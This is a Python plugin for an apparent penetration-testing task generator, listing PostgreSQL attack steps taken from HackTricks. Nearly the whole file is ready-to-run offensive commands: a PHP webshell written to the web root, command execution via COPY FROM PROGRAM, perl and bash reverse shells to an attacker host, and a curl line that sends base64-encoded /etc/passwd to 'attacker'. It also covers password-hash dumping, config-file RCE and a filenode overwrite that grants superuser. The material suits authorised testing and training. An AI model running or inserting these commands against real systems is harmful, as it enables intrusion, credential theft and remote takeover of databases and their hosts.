"""
PostgreSQL service enumeration plugin

Generates tasks for PostgreSQL enumeration including:
- Connection testing and authentication
- Role and privilege enumeration
- File system read/write operations
- RCE via COPY FROM PROGRAM
- Configuration file exploitation
- Large object exploitation
- Privilege escalation techniques

Extracted from HackTricks: pentesting-postgresql.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PostgreSQLPlugin(ServicePlugin):
    """PostgreSQL enumeration plugin"""

    @property
    def name(self) -> str:
        return "postgresql"

    @property
    def default_ports(self) -> List[int]:
        return [5432, 5433]

    @property
    def service_names(self) -> List[str]:
        return ['postgresql', 'postgres', 'pgsql']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect PostgreSQL services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate PostgreSQL enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', 'PostgreSQL')

        tasks = {
            'id': f'postgresql-enum-{port}',
            'name': f'PostgreSQL Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Basic Connection Test
        tasks['children'].append({
            'id': f'psql-connect-{port}',
            'name': 'Test PostgreSQL Connection',
            'type': 'command',
            'metadata': {
                'command': f'psql -h {target} -p {port} -U postgres',
                'description': 'Attempt connection with default postgres user (password may be prompted)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-h': f'Target host ({target})',
                    '-p': f'Target port ({port})',
                    '-U': 'Username to connect as (try: postgres, admin, root)'
                },
                'success_indicators': [
                    'psql prompt appears (postgres=#)',
                    'Connection established without error'
                ],
                'failure_indicators': [
                    'password authentication failed',
                    'Connection refused',
                    'no pg_hba.conf entry for host'
                ],
                'next_steps': [
                    'If connected: enumerate databases with \\l',
                    'Check user privileges with \\du',
                    'List tables with \\d',
                    'If auth fails: try null password, brute-force, or exploit'
                ],
                'alternatives': [
                    f'Manual: nc {target} {port} (basic connectivity test)',
                    f'nmap --script pgsql-brute -p{port} {target}',
                    'Try default passwords: postgres:postgres, postgres:<blank>'
                ],
                'notes': 'Common default usernames: postgres, admin, root. AWS RDS uses special "rdsadmin" database.'
            }
        })

        # TASK 2: Version and Info Gathering
        tasks['children'].append({
            'id': f'pgsql-version-{port}',
            'name': 'PostgreSQL Version Detection',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script pgsql-brute -p{port} {target}',
                'description': 'Detect PostgreSQL version and configuration details',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '--script': 'Execute NSE script for PostgreSQL enumeration',
                    'pgsql-brute': 'Attempts version detection and weak credential testing',
                    '-p': f'Target specific port ({port})'
                },
                'success_indicators': [
                    'PostgreSQL version identified',
                    'Service banner captured'
                ],
                'failure_indicators': [
                    'Service filtered/blocked',
                    'No version information disclosed'
                ],
                'next_steps': [
                    'Search version for CVEs with searchsploit',
                    'Check for version-specific vulnerabilities',
                    'Research known exploits for detected version'
                ],
                'alternatives': [
                    'Manual: SELECT version(); after connecting',
                    f'Metasploit: use auxiliary/scanner/postgres/postgres_version'
                ],
                'estimated_time': '1-2 minutes'
            }
        })

        # TASK 3: Credential Brute-force
        tasks['children'].append({
            'id': f'pgsql-brute-{port}',
            'name': 'PostgreSQL Credential Brute-force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt {target} postgres -s {port}',
                'description': 'Brute-force PostgreSQL authentication with common credentials',
                'tags': ['OSCP:MEDIUM', 'NOISY', 'BRUTE_FORCE'],
                'flag_explanations': {
                    '-L': 'Username wordlist (postgres-specific defaults)',
                    '-P': 'Password wordlist (postgres-specific defaults)',
                    'postgres': 'Service type for hydra',
                    '-s': 'Custom port specification'
                },
                'success_indicators': [
                    'Valid credentials found (username:password)',
                    'Login successful message from hydra'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Account lockout triggered',
                    'Connection timeouts (rate limiting)'
                ],
                'next_steps': [
                    'Use found credentials to connect via psql',
                    'Enumerate user privileges and databases',
                    'Look for sensitive data or exploitation paths'
                ],
                'alternatives': [
                    f'Metasploit: use auxiliary/scanner/postgres/postgres_login',
                    'Manual: Try common passwords (postgres, password, admin, 123456)',
                    'Custom script with python psycopg2 library'
                ],
                'notes': 'Brute-force may trigger account lockout. Try default credentials first.',
                'estimated_time': '10-30 minutes'
            }
        })

        # TASK 4: Privilege Enumeration (requires auth)
        tasks['children'].append({
            'id': f'pgsql-privs-{port}',
            'name': 'Enumerate Roles and Privileges',
            'type': 'manual',
            'metadata': {
                'description': 'Enumerate PostgreSQL roles, groups, and privileges (requires authenticated connection)',
                'tags': ['MANUAL', 'OSCP:HIGH', 'ENUM'],
                'command': f'psql -h {target} -p {port} -U <USERNAME> -c "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles;"',
                'flag_explanations': {
                    '-c': 'Execute SQL command and exit',
                    'pg_roles': 'System catalog view containing all database roles'
                },
                'success_indicators': [
                    'Role listing displayed',
                    'Superuser roles identified (rolsuper=t)',
                    'CREATEROLE privilege detected'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Must be superuser to view pg_roles'
                ],
                'next_steps': [
                    'If superuser: Exploit file read/write/RCE capabilities',
                    'If CREATEROLE: Escalate to pg_execute_server_program group',
                    'If member of pg_read_server_files: Read /etc/passwd',
                    'If member of pg_write_server_files: Write webshell'
                ],
                'alternatives': [
                    'Interactive: \\du (list users/roles)',
                    'SQL: SELECT * FROM pg_shadow; (view password hashes)',
                    'SQL: SELECT current_setting(\'is_superuser\'); (check if current user is superuser)'
                ],
                'notes': 'Key groups: pg_execute_server_program (RCE), pg_read_server_files (file read), pg_write_server_files (file write)'
            }
        })

        # TASK 5: File System Enumeration
        tasks['children'].append({
            'id': f'pgsql-filesystem-{port}',
            'name': 'File System Read/List Operations',
            'type': 'parent',
            'children': [
                {
                    'id': f'pgsql-read-file-{port}',
                    'name': 'Read Sensitive Files',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read files from filesystem (requires superuser or pg_read_server_files membership)',
                        'tags': ['MANUAL', 'OSCP:HIGH'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "CREATE TABLE demo(t text); COPY demo FROM \'/etc/passwd\'; SELECT * FROM demo;"',
                        'flag_explanations': {
                            'CREATE TABLE': 'Temporary table to store file contents',
                            'COPY FROM': 'PostgreSQL COPY command to read file into table',
                            '/etc/passwd': 'Target file (try: /etc/shadow, /var/www/html/config.php, ~/.ssh/id_rsa)'
                        },
                        'success_indicators': [
                            'File contents displayed in table',
                            'No permission denied error'
                        ],
                        'failure_indicators': [
                            'must be superuser or a member of pg_read_server_files',
                            'could not open file for reading: Permission denied'
                        ],
                        'next_steps': [
                            'Read PostgreSQL config: /etc/postgresql/*/main/postgresql.conf',
                            'Read pg_hba.conf for auth rules',
                            'Look for credentials in web app configs',
                            'Download SSH keys from user home directories'
                        ],
                        'alternatives': [
                            'SQL: SELECT * FROM pg_read_file(\'/etc/passwd\', 0, 1000000);',
                            'SQL: SELECT * FROM pg_read_binary_file(\'/etc/passwd\');',
                            'SQL: SELECT * FROM pg_ls_dir(\'/tmp\');',
                            'If CREATEROLE: GRANT pg_read_server_files TO username;'
                        ],
                        'notes': 'COPY method limited to non-binary text files. Use pg_read_binary_file() for binaries.'
                    }
                },
                {
                    'id': f'pgsql-write-file-{port}',
                    'name': 'Write Files to Filesystem',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Write files to filesystem (requires superuser or pg_write_server_files)',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "COPY (SELECT \'<?php system($_GET[\"cmd\"]); ?>\') TO \'/var/www/html/shell.php\';"',
                        'flag_explanations': {
                            'COPY TO': 'Write query result to file',
                            '/var/www/html/': 'Web root (adjust based on target OS/web server)'
                        },
                        'success_indicators': [
                            'File written successfully',
                            'COPY command returns success'
                        ],
                        'failure_indicators': [
                            'must be superuser or member of pg_write_server_files',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Access webshell: curl http://{target}/shell.php?cmd=id',
                            'Upgrade to reverse shell',
                            'Establish persistence'
                        ],
                        'alternatives': [
                            'Base64 encode payload to bypass newline restrictions',
                            'Use large objects (lo_*) for binary file upload',
                            'Overwrite cron jobs or SSH authorized_keys',
                            'If CREATEROLE: GRANT pg_write_server_files TO username;'
                        ],
                        'notes': 'COPY cannot write binary files (modifies bytes). Use lo_import/lo_export for binaries.'
                    }
                }
            ]
        })

        # TASK 6: RCE via COPY FROM PROGRAM
        tasks['children'].append({
            'id': f'pgsql-rce-{port}',
            'name': 'RCE via COPY FROM PROGRAM',
            'type': 'parent',
            'children': [
                {
                    'id': f'pgsql-copy-rce-{port}',
                    'name': 'Execute Commands via COPY',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute OS commands via COPY FROM PROGRAM (requires superuser or pg_execute_server_program)',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \'id\'; SELECT * FROM cmd_exec;"',
                        'flag_explanations': {
                            'COPY FROM PROGRAM': 'Execute shell command and read output into table',
                            'id': 'Test command (replace with actual payload)'
                        },
                        'success_indicators': [
                            'Command output displayed in table',
                            'uid=xxx(postgres) gid=xxx'
                        ],
                        'failure_indicators': [
                            'must be superuser or member of pg_execute_server_program',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Execute reverse shell payload',
                            'Download and execute exploit scripts',
                            'Enumerate system for privilege escalation',
                            'Establish persistence'
                        ],
                        'alternatives': [
                            'Metasploit: use multi/postgres/postgres_copy_from_program_cmd_exec',
                            'Reverse shell: COPY cmd_exec FROM PROGRAM \'bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\"\';',
                            'Exfiltration: COPY (SELECT \'\') TO PROGRAM \'curl http://attacker/?data=$(cat /etc/passwd|base64)\'',
                            'If CREATEROLE: GRANT pg_execute_server_program TO username;'
                        ],
                        'notes': 'CVE-2019-9193 - Postgres declared this a feature, not a vuln. Escape single quotes with two single quotes.'
                    }
                },
                {
                    'id': f'pgsql-reverse-shell-{port}',
                    'name': 'PostgreSQL Reverse Shell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Gain reverse shell via COPY FROM PROGRAM',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "COPY files FROM PROGRAM \'perl -MIO -e \'\'\\$p=fork;exit,if(\\$p);\\$c=new IO::Socket::INET(PeerAddr,\"LHOST:LPORT\");STDIN->fdopen(\\$c,r);\\$~->fdopen(\\$c,w);system\\$_ while<>;\'\'\';"',
                        'flag_explanations': {
                            'perl -MIO': 'Perl reverse shell payload',
                            'LHOST:LPORT': 'Replace with attacker IP:port (nc -lvnp LPORT)'
                        },
                        'success_indicators': [
                            'Connection received on netcat listener',
                            'Shell prompt appears'
                        ],
                        'failure_indicators': [
                            'Connection timeout',
                            'Firewall blocking outbound connections',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Stabilize shell: python -c \'import pty;pty.spawn(\"/bin/bash\")\'',
                            'Enumerate PostgreSQL data directory',
                            'Search for credentials in config files',
                            'Escalate to root via kernel exploits or sudo'
                        ],
                        'alternatives': [
                            'Bash reverse shell: bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'',
                            'Python reverse shell: python -c \'import socket...\' ',
                            'NC reverse shell: nc -e /bin/bash LHOST LPORT',
                            'Meterpreter payload via staged exploit'
                        ],
                        'notes': 'Start listener first: nc -lvnp 4444. Escape quotes carefully in SQL.'
                    }
                }
            ]
        })

        # TASK 7: Configuration File Exploitation
        tasks['children'].append({
            'id': f'pgsql-config-exploit-{port}',
            'name': 'PostgreSQL Configuration RCE',
            'type': 'parent',
            'children': [
                {
                    'id': f'pgsql-ssl-passphrase-{port}',
                    'name': 'RCE via ssl_passphrase_command',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit postgresql.conf ssl_passphrase_command for RCE (requires file write)',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'EXPLOIT'],
                        'command': 'Multi-step attack - see notes',
                        'flag_explanations': {
                            'ssl_passphrase_command': 'Command executed when encrypted SSL key is loaded',
                            'ssl_passphrase_command_supports_reload': 'Execute on pg_reload_conf() call'
                        },
                        'success_indicators': [
                            'Configuration reloaded successfully',
                            'Reverse shell received',
                            'Command executed as postgres user'
                        ],
                        'failure_indicators': [
                            'SSL key wrong permissions (must be 640)',
                            'pg_reload_conf() permission denied',
                            'Payload syntax error'
                        ],
                        'next_steps': [
                            'Stabilize shell',
                            'Enumerate database for credentials',
                            'Pivot to web application or other services',
                            'Escalate to root'
                        ],
                        'alternatives': [
                            'archive_command exploitation',
                            'session_preload_libraries RCE',
                            'Direct COPY FROM PROGRAM if available'
                        ],
                        'notes': 'Steps: 1) Download ssl key, 2) Encrypt with password, 3) Re-upload, 4) Overwrite postgresql.conf with ssl_passphrase_command payload, 5) Call pg_reload_conf(). Key must have 640 perms, owned by root:ssl-cert.'
                    }
                },
                {
                    'id': f'pgsql-archive-command-{port}',
                    'name': 'RCE via archive_command',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit postgresql.conf archive_command for RCE via WAL operations',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "SELECT current_setting(\'archive_mode\');"',
                        'flag_explanations': {
                            'archive_mode': 'Must be "on" or "always" for this exploit',
                            'archive_command': 'Command executed during WAL archiving',
                            'pg_switch_wal()': 'Force WAL operation to trigger archive_command'
                        },
                        'success_indicators': [
                            'archive_mode is "on" or "always"',
                            'archive_command modified successfully',
                            'Payload executed after pg_switch_wal()'
                        ],
                        'failure_indicators': [
                            'archive_mode is "off"',
                            'Cannot modify postgresql.conf',
                            'pg_switch_wal() permission denied'
                        ],
                        'next_steps': [
                            'Overwrite archive_command with reverse shell',
                            'Reload config: SELECT pg_reload_conf();',
                            'Trigger: SELECT pg_switch_wal();',
                            'Receive shell and escalate'
                        ],
                        'alternatives': [
                            'Base64 encode payload in archive_command',
                            'Use staged payload (download + execute)',
                            'Combine with cron persistence'
                        ],
                        'notes': 'Example payload: archive_command = \'echo "BASE64_REVERSE_SHELL" | base64 -d | bash\'. Check current value first to restore later.'
                    }
                },
                {
                    'id': f'pgsql-preload-lib-{port}',
                    'name': 'RCE via session_preload_libraries',
                    'type': 'manual',
                    'metadata': {
                        'description': 'RCE by loading malicious shared library on client connection',
                        'tags': ['MANUAL', 'OSCP:LOW', 'EXPLOIT'],
                        'command': 'Multi-step attack - compile .so, upload, modify config',
                        'flag_explanations': {
                            'session_preload_libraries': 'Libraries loaded at client connection',
                            'dynamic_library_path': 'Search path for libraries (add /tmp/)'
                        },
                        'success_indicators': [
                            'Malicious .so uploaded to /tmp/',
                            'Config modified successfully',
                            'Reverse shell on next connection'
                        ],
                        'failure_indicators': [
                            'Compilation failed (wrong PostgreSQL version)',
                            'Library not found',
                            'Cannot write to /tmp/'
                        ],
                        'next_steps': [
                            'Compile malicious .so with reverse shell',
                            'Upload to /tmp/ via lo_export',
                            'Modify config: dynamic_library_path = \'/tmp:$libdir\'',
                            'Set session_preload_libraries = \'payload.so\'',
                            'Reload config and reconnect'
                        ],
                        'alternatives': [
                            'Use existing PostgreSQL extensions',
                            'Compile for specific PostgreSQL version from SELECT version()',
                            'Target local_preload_libraries for next DB restart'
                        ],
                        'notes': 'Requires pg_config --includedir-server for compilation. Get major version with SELECT version(). Code must have _init() function with PG_MODULE_MAGIC.'
                    }
                }
            ]
        })

        # TASK 8: Privilege Escalation
        tasks['children'].append({
            'id': f'pgsql-privesc-{port}',
            'name': 'PostgreSQL Privilege Escalation',
            'type': 'parent',
            'children': [
                {
                    'id': f'pgsql-createrole-{port}',
                    'name': 'CREATEROLE Privilege Escalation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Escalate privileges using CREATEROLE role to join powerful groups',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'PRIVESC'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "GRANT pg_execute_server_program TO <USERNAME>;"',
                        'flag_explanations': {
                            'GRANT': 'Add user to group/role',
                            'pg_execute_server_program': 'Group with RCE capabilities via COPY FROM PROGRAM',
                            'CREATEROLE': 'Privilege allowing role membership modification'
                        },
                        'success_indicators': [
                            'GRANT successful',
                            'User now member of powerful group',
                            'Can execute COPY FROM PROGRAM'
                        ],
                        'failure_indicators': [
                            'Cannot GRANT on role without being member',
                            'Permission denied',
                            'User lacks CREATEROLE privilege'
                        ],
                        'next_steps': [
                            'GRANT pg_execute_server_program TO username; (RCE)',
                            'GRANT pg_read_server_files TO username; (file read)',
                            'GRANT pg_write_server_files TO username; (file write)',
                            'Execute RCE payload via COPY FROM PROGRAM'
                        ],
                        'alternatives': [
                            'Change password of other user: ALTER USER victim WITH PASSWORD \'newpass\';',
                            'Create new superuser if local auth allows: COPY TO PROGRAM \'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER;"\'',
                            'Modify pg_authid table via filenode overwrite'
                        ],
                        'notes': 'CREATEROLE can grant membership in ANY non-superuser role. Check with: SELECT rolcreaterole FROM pg_roles WHERE rolname = current_user;'
                    }
                },
                {
                    'id': f'pgsql-local-login-{port}',
                    'name': 'Local Login Bypass via dblink',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass remote auth restrictions by connecting to localhost via dblink',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'PRIVESC'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "CREATE EXTENSION dblink; SELECT * FROM dblink(\'host=127.0.0.1 user=postgres dbname=postgres\', \'SELECT usename,passwd FROM pg_shadow\') RETURNS (result TEXT);"',
                        'flag_explanations': {
                            'CREATE EXTENSION dblink': 'Enable dblink functionality for remote connections',
                            'host=127.0.0.1': 'Connect to localhost (may allow password-less trust auth)',
                            'pg_shadow': 'System table with password hashes'
                        },
                        'success_indicators': [
                            'dblink extension created',
                            'Connection to localhost successful',
                            'Password hashes extracted'
                        ],
                        'failure_indicators': [
                            'dblink extension not available',
                            'Local trust authentication disabled',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Extract password hashes',
                            'Crack hashes with hashcat/john',
                            'Use dblink to execute privileged queries',
                            'Enumerate all databases via localhost connection'
                        ],
                        'alternatives': [
                            'Check pg_hba.conf for trust auth rules',
                            'Try different localhost users (postgres, admin)',
                            'Use dblink for port scanning: dblink(\'host=INTERNAL_IP port=PORT ...\')'
                        ],
                        'notes': 'Common pg_hba.conf allows local trust auth: "local all all trust" or "host all all 127.0.0.1/32 trust". Check if dblink exists: SELECT * FROM pg_proc WHERE proname=\'dblink\';'
                    }
                },
                {
                    'id': f'pgsql-filenode-overwrite-{port}',
                    'name': 'Privilege Escalation via Filenode Overwrite',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Become superuser by overwriting pg_authid table filenode on disk',
                        'tags': ['MANUAL', 'OSCP:LOW', 'PRIVESC'],
                        'command': 'Multi-step attack - download filenode, edit, re-upload',
                        'flag_explanations': {
                            'pg_relation_filepath': 'Get on-disk path to table data',
                            'lo_import/lo_export': 'Large object functions for file download/upload',
                            'pg_authid': 'System table storing user roles and privileges'
                        },
                        'success_indicators': [
                            'pg_authid filenode downloaded',
                            'Edited filenode re-uploaded',
                            'User gains superuser privileges'
                        ],
                        'failure_indicators': [
                            'Cannot read/write PostgreSQL data directory',
                            'Filenode editor fails',
                            'Corrupted table after overwrite'
                        ],
                        'next_steps': [
                            'Get data directory: SELECT setting FROM pg_settings WHERE name = \'data_directory\';',
                            'Get filenode path: SELECT pg_relation_filepath(\'pg_authid\');',
                            'Download: SELECT lo_import(\'/var/lib/postgresql/13/main/base/X/XXXX\', 1337);',
                            'Edit with postgresql-filenode-editor, set rolsuper=1',
                            'Upload: SELECT lo_export(1337, \'/path/to/filenode\');',
                            'Clear cache: SELECT lo_from_bytea(1338, REPEAT(\'a\', 128*1024*1024)::bytea);'
                        ],
                        'alternatives': [
                            'Overwrite custom application tables instead',
                            'Edit configuration files if write access available',
                            'Use ALTER TABLE privilege escalation (GCP-specific)'
                        ],
                        'notes': 'Requires: pg_read_server_files + pg_write_server_files. Tool: https://github.com/adeadfed/postgresql-filenode-editor. Complex attack, requires deep PostgreSQL knowledge.'
                    }
                }
            ]
        })

        # TASK 9: Post-Exploitation
        tasks['children'].append({
            'id': f'pgsql-post-{port}',
            'name': 'Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'pgsql-dump-hashes-{port}',
                    'name': 'Dump Password Hashes',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract PostgreSQL user password hashes',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'POST_EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "SELECT usename, passwd FROM pg_shadow;"',
                        'flag_explanations': {
                            'pg_shadow': 'System view containing password hashes',
                            'usename': 'Username column',
                            'passwd': 'Password hash (md5 or scram-sha-256)'
                        },
                        'success_indicators': [
                            'Password hashes displayed',
                            'Multiple users enumerated'
                        ],
                        'failure_indicators': [
                            'Permission denied (requires superuser)',
                            'Empty passwd column'
                        ],
                        'next_steps': [
                            'Crack hashes with hashcat -m 12 (PostgreSQL md5)',
                            'Try hashes on other services (password reuse)',
                            'Use found passwords for lateral movement'
                        ],
                        'alternatives': [
                            'Metasploit: use auxiliary/scanner/postgres/postgres_hashdump',
                            'Query: SELECT rolname, rolpassword FROM pg_authid;',
                            'Read shadow file if pg_read_server_files access'
                        ],
                        'notes': 'PostgreSQL hash format: md5<hash of password+username>. Need superuser or special privileges to view pg_shadow.'
                    }
                },
                {
                    'id': f'pgsql-enum-databases-{port}',
                    'name': 'Enumerate Databases and Tables',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Complete database and table enumeration',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'ENUM'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME>',
                        'flag_explanations': {
                            '\\l': 'List all databases',
                            '\\c <database>': 'Connect to specific database',
                            '\\d': 'List tables in current database',
                            '\\du': 'List users and roles'
                        },
                        'success_indicators': [
                            'Database list displayed',
                            'Tables enumerated',
                            'Sensitive data found (users, passwords, API keys)'
                        ],
                        'failure_indicators': [
                            'Access denied to databases',
                            'No interesting data found'
                        ],
                        'next_steps': [
                            'SELECT * FROM users; (extract credentials)',
                            'Look for API keys, tokens, secrets',
                            'Search for admin accounts',
                            'Check for backup or config tables'
                        ],
                        'alternatives': [
                            'SQL: SELECT datname FROM pg_database;',
                            'SQL: SELECT table_name FROM information_schema.tables;',
                            'Metasploit: use auxiliary/scanner/postgres/postgres_schemadump'
                        ],
                        'notes': 'AWS RDS indicators: database named "rdsadmin". Common interesting tables: users, accounts, credentials, config, secrets.'
                    }
                },
                {
                    'id': f'pgsql-command-history-{port}',
                    'name': 'Review Command History',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check PostgreSQL command history for credentials and sensitive queries',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'POST_EXPLOIT'],
                        'command': f'psql -h {target} -p {port} -U <USERNAME> -c "\\s"',
                        'flag_explanations': {
                            '\\s': 'Display command history in psql'
                        },
                        'success_indicators': [
                            'Command history displayed',
                            'Credentials found in previous queries',
                            'Sensitive data revealed'
                        ],
                        'failure_indicators': [
                            'History empty',
                            'No sensitive information'
                        ],
                        'next_steps': [
                            'Extract credentials from history',
                            'Note interesting queries for understanding app',
                            'Look for hardcoded passwords in CREATE USER statements'
                        ],
                        'alternatives': [
                            'Read .psql_history file if shell access',
                            'Check PostgreSQL logs: /var/lib/postgresql/*/main/log/',
                            'Enable logging in postgresql.conf: log_statement = \'all\''
                        ],
                        'notes': 'Command history often contains hardcoded credentials in CREATE USER or ALTER USER statements.'
                    }
                }
            ]
        })

        # TASK 10: Metasploit Modules
        tasks['children'].append({
            'id': f'pgsql-metasploit-{port}',
            'name': 'Metasploit PostgreSQL Modules',
            'type': 'manual',
            'metadata': {
                'description': 'Metasploit auxiliary and exploit modules for PostgreSQL',
                'tags': ['AUTOMATED', 'OSCP:MEDIUM'],
                'command': 'msfconsole',
                'flag_explanations': {},
                'success_indicators': [
                    'Module executed successfully',
                    'Data extracted or shell obtained'
                ],
                'failure_indicators': [
                    'Authentication failed',
                    'Module not compatible with target version'
                ],
                'next_steps': [
                    'Analyze results',
                    'Pivot to manual exploitation',
                    'Establish persistence'
                ],
                'alternatives': [
                    'Manual techniques documented above',
                    'Custom Python scripts with psycopg2'
                ],
                'notes': 'Available modules:\n- auxiliary/scanner/postgres/postgres_version\n- auxiliary/scanner/postgres/postgres_login\n- auxiliary/scanner/postgres/postgres_hashdump\n- auxiliary/scanner/postgres/postgres_schemadump\n- auxiliary/admin/postgres/postgres_readfile\n- exploit/linux/postgres/postgres_payload\n- exploit/windows/postgres/postgres_payload\n- exploit/multi/postgres/postgres_copy_from_program_cmd_exec'
            }
        })

        # TASK 11: CVE Research (conditional on version)
        if version:
            tasks['children'].append({
                'id': f'pgsql-cve-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-pgsql-{port}',
                        'name': f'SearchSploit: PostgreSQL {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit postgresql {version}',
                            'description': 'Search ExploitDB for known PostgreSQL vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'postgresql': 'Search term',
                                version: 'Specific version to research'
                            },
                            'success_indicators': [
                                'Exploits found in database',
                                'CVE numbers identified'
                            ],
                            'failure_indicators': [
                                'No results found',
                                'Version too new/old for known exploits'
                            ],
                            'next_steps': [
                                'Review exploit details: searchsploit -x <exploit_id>',
                                'Download exploit: searchsploit -m <exploit_id>',
                                'Test exploit in controlled environment first',
                                'Adapt exploit to target environment'
                            ],
                            'alternatives': [
                                'Google: "PostgreSQL {version} exploit"',
                                'Check GitHub for PoC exploits',
                                'Review PostgreSQL security advisories',
                                'Search CVE databases: cve.mitre.org'
                            ],
                            'estimated_time': '5-10 minutes'
                        }
                    },
                    {
                        'id': f'cve-lookup-pgsql-{port}',
                        'name': f'CVE Database Lookup',
                        'type': 'research',
                        'metadata': {
                            'description': f'Research CVEs for PostgreSQL {version}',
                            'tags': ['RESEARCH', 'OSCP:MEDIUM'],
                            'command': f'# Manual research: https://www.cvedetails.com/vulnerability-list/vendor_id-336/product_id-575/Postgresql-Postgresql.html',
                            'notes': f'Search for PostgreSQL {version} in CVE databases, security mailing lists, and vendor advisories. Focus on RCE and privilege escalation vulnerabilities.'
                        }
                    }
                ]
            })

        return tasks
